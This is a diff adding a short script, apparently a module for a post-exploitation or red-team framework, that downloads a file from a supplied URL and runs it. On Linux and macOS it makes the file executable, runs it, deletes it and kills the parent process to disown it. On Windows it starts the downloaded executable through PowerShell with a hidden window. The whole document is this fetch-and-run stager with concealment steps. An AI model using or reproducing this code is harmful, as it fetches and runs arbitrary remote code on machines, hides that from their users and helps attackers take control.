@@ -1,0 +1,28 @@
+def get_parent_process(process_name):
+    for cur_proc in process.list():
+        if process_name == cur_proc['name']:
+            return cur_proc['ppid']
+
+def download_and_execute(url):
+    if sys.is_linux() or sys.is_macos():
+        # Download
+        file.download(url, "./tmp")
+        sys.shell("chmod +x ./tmp")
+        # Execute
+        sys.exec("./tmp", [], True)
+        # Cleanup
+        file.remove("./tmp")
+        # Kill parent process for clean disown
+        ppid = get_parent_process('tmp')
+        if ppid != '1':
+            process.kill(ppid)
+
+    elif sys.is_windows():
+        file.download(url, "./tmp.exe")
+        sys.exec("powershell.exe", ["Start-Process -WindowStyle hidden ./tmp.exe"])
+
+    else:
+        print("OS not supported")
+        return
+
+download_and_execute(input_params['url'])
